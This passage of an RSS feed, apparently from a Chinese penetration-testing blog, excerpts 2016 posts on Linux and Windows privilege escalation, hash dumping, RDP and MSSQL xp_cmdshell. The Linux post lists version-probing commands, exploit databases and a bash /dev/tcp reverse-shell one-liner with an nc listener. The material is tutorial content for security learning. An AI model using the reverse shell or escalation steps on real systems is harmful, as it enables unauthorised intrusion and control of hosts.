+&lt;p>常见命令可以看下 &lt;a href="https://www.comparitech.com/net-admin/metasploit-cheat-sheet/?_blank">https://www.comparitech.com/net-admin/metasploit-cheat-sheet/&lt;/a>&lt;/p></description></item><item><title>Linux 下系统漏洞提权</title><link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link><pubDate>Tue, 09 Aug 2016 19:23:13 +0000</pubDate><guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid><description>&lt;h3 id="0x00-linux下的提权">0x00 Linux下的提权&lt;/h3>
+&lt;p>Linux下一般都是系统漏洞提权，分为以下几个步骤：&lt;/p>
+&lt;pre tabindex="0">&lt;code>1. 获取系统版本号
+2. 根据系统版本号找对应exp
+3. 反弹shell
+4. 尝试利用
+&lt;/code>&lt;/pre>&lt;h3 id="0x01-提权">0x01 提权&lt;/h3>
+&lt;ul>
+&lt;li>获取系统版本号
+&lt;ul>
+&lt;li>获取发行版本
+&lt;ul>
+&lt;li>cat /etc/*-release&lt;/li>
+&lt;li>cat /etc/issue&lt;/li>
+&lt;li>cat /etc/lsb-release&lt;/li>
+&lt;li>cat /etc/redhat-release&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>获取内核版本
+&lt;ul>
+&lt;li>cat /proc/version&lt;/li>
+&lt;li>uname -a&lt;/li>
+&lt;li>uname -mrs&lt;/li>
+&lt;li>rpm -q kernel&lt;/li>
+&lt;li>dmesg | grep Linux&lt;/li>
+&lt;li>ls /boot | grep vmlinuz&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>根据系统版本号找对应exp
+&lt;ul>
+&lt;li>&lt;a href="http://www.exploit-db.com">http://www.exploit-db.com&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://1337day.com">http://1337day.com&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.securiteam.com">http://www.securiteam.com&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.securityfocus.com">http://www.securityfocus.com&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.exploitsearch.net">http://www.exploitsearch.net&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://metasploit.com/modules">http://metasploit.com/modules&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://securityreason.com">http://securityreason.com&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://seclists.org/fulldisclosure">http://seclists.org/fulldisclosure&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.google.com">http://www.google.com&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>反弹shell
+&lt;ul>
+&lt;li>本地：&lt;code>nc -l -p 8888&lt;/code>&lt;/li>
+&lt;li>目标机器：&lt;code>/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>尝试利用&lt;/li>
+&lt;/ul>
+&lt;h3 id="0x02-实例">0x02 实例&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>得到系统版本号
+&lt;img src="https://wyb0.com/img/post/privilge_escalation_linux_get_sys_version.png" alt="得到系统版本号">&lt;/p></description></item><item><title>导出 Windows 主机密码与开启 3389</title><link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link><pubDate>Mon, 08 Aug 2016 08:28:27 +0000</pubDate><guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid><description>&lt;h3 id="0x00-导出主机密码hash">0x00 导出主机密码hash&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>关于Windows的hash&lt;/p>
+&lt;ul>
+&lt;li>早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash&lt;/li>
+&lt;li>Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值&lt;/li>
+&lt;li>存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>导出hash条件&lt;/p></description></item><item><title>Windows 下第三方服务提权</title><link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link><pubDate>Sun, 07 Aug 2016 23:38:58 +0000</pubDate><guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid><description>&lt;h3 id="0x00--mssql提权">0x00 MSSQL提权&lt;/h3>
+&lt;p>MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权&lt;br>
+提权条件：数据库账号是DBA权限&lt;/p></description></item><item><title>Windows 下系统漏洞提权</title><link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link><pubDate>Sun, 07 Aug 2016 21:31:35 +0000</pubDate><guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid><description>&lt;p>提权是在已经getshell但是权限不大的前提下做的&lt;/p>
+&lt;h3 id="0x00-查看基本信息">0x00 查看基本信息&lt;/h3>
+&lt;p>&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_view_msg1.png" alt="Windows系统漏洞提权-查看基本信息1">&lt;/p>
+&lt;p>&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_view_msg2.png" alt="Windows系统漏洞提权-查看基本信息2">&lt;/p>
+&lt;h3 id="0x01-使用cmd执行命令">0x01 使用cmd执行命令&lt;/h3>
+&lt;ul>
+&lt;li>
+&lt;p>尝试使用cmd执行命令
+&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_try_use_cmd.png" alt="Windows系统漏洞提权-尝试使用cmd执行命令">&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>找可写目录
+&lt;img src="https://wyb0.com/img/post/privilge_escalation_win_find_wirteable_dir.png" alt="Windows系统漏洞提权-找可写目录">&lt;/p></description></item></channel></rss>
